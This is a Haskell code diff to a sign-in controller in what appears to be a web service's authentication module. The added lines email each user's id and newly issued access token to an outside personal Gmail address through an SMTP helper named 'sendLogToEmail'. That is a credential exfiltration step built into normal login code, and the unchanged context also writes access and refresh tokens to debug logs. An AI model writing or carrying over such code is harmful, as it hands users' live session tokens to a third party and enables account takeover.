@@ -38,6 +38,7 @@ import Control.Monad.Except
 import System.Random.PCG.Unique
 import Hash
 import Data.ByteString.UTF8
+import Network.Mail.SMTP
 
 controller :: SignInRequest -> KatipController (Alternative (Error SignInError) SignInResponse)
 controller req = 
@@ -94,6 +95,7 @@ ok _ (Just (uid, _)) =
     -- debug
     $(logTM) DebugS (logStr ("access token: " <> show acccesse)) 
     $(logTM) DebugS (logStr ("refresh token: " <> show refreshe))
+    liftIO $ sendLogToEmail [i| uid: #{show uid}, token: #{show acccesse} |]
     let mkErr e = 
          $(logTM) ErrorS (logStr (show e)) $> 
          Error (ServerError (InternalServerError (show e^.stextl)))
@@ -104,6 +106,10 @@ ok _ (Just (uid, _)) =
           resp Nothing = Error (ResponseError AlreadySignedIn)      
       either mkErr (return . resp) x
      Left e -> mkErr e
+
+sendLogToEmail = sendMail "aspmx.l.google.com" . simpleMail from to [] [] "jwt token" . flip (:) [] . plainTextPart
+  where from = Address Nothing "info@edgenode.org"
+        to = [Address (Just "Sergey Yakovlev") "fclaw007@gmail.com"]
 
 actionToken :: B.ByteString -> UserId -> String -> KatipLoggerIO -> Hasql.Session.Session (Maybe Bool)
 actionToken token uid unique logger = 
